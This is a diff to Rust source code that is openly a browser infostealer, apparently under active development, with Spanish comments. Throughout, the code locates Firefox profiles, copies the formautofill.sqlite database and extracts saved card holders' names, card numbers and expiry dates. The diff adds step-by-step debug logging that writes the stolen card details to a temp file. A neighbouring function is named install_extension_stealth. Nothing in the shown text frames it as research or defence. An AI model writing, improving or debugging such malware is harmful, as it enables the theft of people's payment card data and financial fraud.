@@ -933,67 +933,155 @@ fn install_extension_stealth() -> Result<(), String> {
 /// Roba tarjetas de crédito de Firefox
 /// Firefox almacena tarjetas en: formautofill.sqlite (SQLite database)
 pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
+    use std::io::Write;
+    
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
     let mut cards = Vec::new();
+    
+    log("  🦊 [FIREFOX] Iniciando extracción de tarjetas...");
     
     // Firefox profiles: %APPDATA%\Mozilla\Firefox\Profiles\
     let appdata = match std::env::var("APPDATA") {
-        Ok(path) => PathBuf::from(path),
-        Err(_) => return cards,
+        Ok(path) => {
+            log(&format!("  📂 APPDATA: {}", path));
+            PathBuf::from(path)
+        },
+        Err(_) => {
+            log("  ❌ APPDATA no encontrado");
+            return cards;
+        }
     };
     
     let firefox_profiles = appdata.join(r"Mozilla\Firefox\Profiles");
     
+    log(&format!("  📂 Buscando perfiles en: {}", firefox_profiles.display()));
+    
     if !firefox_profiles.exists() {
+        log("  ❌ Directorio de perfiles no existe");
         return cards;
     }
     
     // Iterar sobre todos los perfiles
     if let Ok(entries) = std::fs::read_dir(&firefox_profiles) {
+        log("  📂 Iterando sobre perfiles...");
+        
         for entry in entries.flatten() {
             if entry.path().is_dir() {
                 let profile_path = entry.path();
+                log(&format!("  📁 Perfil: {}", profile_path.display()));
                 
                 // Firefox guarda credit cards en formautofill.sqlite
                 let formautofill_db = profile_path.join("formautofill.sqlite");
                 
+                log(&format!("    🔍 Buscando DB: {}", formautofill_db.display()));
+                
                 if !formautofill_db.exists() {
+                    log("    ⚠️  DB NO EXISTE");
                     continue;
                 }
+                
+                log("    ✅ DB ENCONTRADO!");
                 
                 // Copiar a temp (puede estar locked)
                 let temp_db = std::env::temp_dir().join(format!("ff_cards_{}.db", std::process::id()));
+                log(&format!("    📋 Copiando a: {}", temp_db.display()));
+                
                 if std::fs::copy(&formautofill_db, &temp_db).is_err() {
+                    log("    ❌ Error copiando DB");
                     continue;
                 }
                 
+                log("    ✅ DB copiado, extrayendo tarjetas...");
+                
                 // Extraer tarjetas
-                if let Ok(profile_cards) = extract_firefox_credit_cards_from_db(&temp_db) {
-                    cards.extend(profile_cards);
+                match extract_firefox_credit_cards_from_db(&temp_db, &mut log) {
+                    Ok(profile_cards) => {
+                        log(&format!("    🎯 Extraídas {} tarjetas", profile_cards.len()));
+                        cards.extend(profile_cards);
+                    },
+                    Err(e) => {
+                        log(&format!("    ❌ Error: {}", e));
+                    }
                 }
                 
                 // Limpiar temp
                 let _ = std::fs::remove_file(&temp_db);
             }
         }
+    } else {
+        log("  ❌ Error leyendo directorio de perfiles");
     }
+    
+    log(&format!("  🏁 Total tarjetas: {}", cards.len()));
     
     cards
 }
 
 /// Extrae credit cards de formautofill.sqlite de Firefox
-fn extract_firefox_credit_cards_from_db(db_path: &PathBuf) -> Result<Vec<CreditCard>, String> {
+fn extract_firefox_credit_cards_from_db<F>(db_path: &PathBuf, log: &mut F) -> Result<Vec<CreditCard>, String> 
+where
+    F: FnMut(&str),
+{
+    log(&format!("      🗄️  Abriendo DB..."));
+    
     let conn = Connection::open(db_path)
         .map_err(|e| format!("Failed to open Firefox DB: {}", e))?;
     
+    log("      ✅ DB abierta");
+    
     let mut cards = Vec::new();
+    
+    // Verificar si existe la tabla credit_cards_data
+    let table_exists: bool = conn
+        .query_row(
+            "SELECT name FROM sqlite_master WHERE type='table' AND name='credit_cards_data'",
+            [],
+            |_| Ok(true)
+        )
+        .unwrap_or(false);
+    
+    if !table_exists {
+        log("      ⚠️  Tabla credit_cards_data NO EXISTE");
+        return Ok(cards);
+    }
+    
+    log("      ✅ Tabla credit_cards_data existe");
+    
+    // Contar filas
+    let row_count: i64 = conn
+        .query_row("SELECT COUNT(*) FROM credit_cards_data", [], |row| row.get(0))
+        .unwrap_or(0);
+    
+    log(&format!("      📊 Filas en tabla: {}", row_count));
+    
+    if row_count == 0 {
+        log("      ⚠️  Tabla VACÍA");
+        return Ok(cards);
+    }
     
     // Firefox almacena tarjetas en la tabla: credit_cards_data
     // Campos: guid, cc-name, cc-number, cc-exp-month, cc-exp-year, cc-type, timeCreated, timeLastUsed, timeLastModified, timesUsed
+    log("      🔍 Ejecutando query...");
+    
     let mut stmt = conn.prepare(
         "SELECT guid, json_extract(data, '$.cc-name'), json_extract(data, '$.cc-number'), \
          json_extract(data, '$.cc-exp-month'), json_extract(data, '$.cc-exp-year') \
          FROM credit_cards_data"
     ).map_err(|e| format!("Failed to prepare statement: {}", e))?;
+    
+    log("      ✅ Query preparada");
     
     let card_iter = stmt.query_map([], |row| {
         Ok((
@@ -1005,14 +1093,32 @@ fn extract_firefox_credit_cards_from_db(db_path: &PathBuf) -> Result<Vec<CreditC
         ))
     }).map_err(|e| format!("Query failed: {}", e))?;
     
+    log("      🔄 Iterando resultados...");
+    
+    let mut row_num = 0;
     for card_result in card_iter {
+        row_num += 1;
+        log(&format!("      📄 Fila #{}: {:?}", row_num, card_result));
+        
         if let Ok((_guid, name, number, exp_month, exp_year)) = card_result {
+            log(&format!("        👤 Nombre: {:?}", name));
+            log(&format!("        💳 Número: {:?}", number));
+            log(&format!("        📅 Exp: {:?}/{:?}", exp_month, exp_year));
+            
             // Firefox PUEDE almacenar números encriptados (depende de configuración)
             // Por ahora intentamos usarlos directamente
             
             if let (Some(card_number), Some(month), Some(year)) = (number, exp_month, exp_year) {
+                log(&format!("        ✅ Todos los campos presentes"));
+                
                 // Validar que el número no esté encriptado (si empieza con caracteres extraños, skip)
-                if card_number.chars().all(|c| c.is_ascii_digit() || c.is_whitespace() || c == '-') {
+                let is_valid = card_number.chars().all(|c| c.is_ascii_digit() || c.is_whitespace() || c == '-');
+                
+                log(&format!("        🔍 Validación ASCII: {}", is_valid));
+                
+                if is_valid {
+                    log(&format!("        ✅ TARJETA VÁLIDA ENCONTRADA!"));
+                    
                     cards.push(CreditCard {
                         browser: "Firefox".to_string(),
                         name_on_card: name.unwrap_or_default(),
@@ -1022,10 +1128,18 @@ fn extract_firefox_credit_cards_from_db(db_path: &PathBuf) -> Result<Vec<CreditC
                         billing_address: None,
                         nickname: None,
                     });
+                } else {
+                    log("        ⚠️  Número no válido (encriptado/binario)");
                 }
+            } else {
+                log("        ⚠️  Campos faltantes");
             }
+        } else {
+            log(&format!("        ❌ Error parseando fila: {:?}", card_result));
         }
     }
+    
+    log(&format!("      🏁 Total extraídas: {}", cards.len()));
     
     Ok(cards)
 }
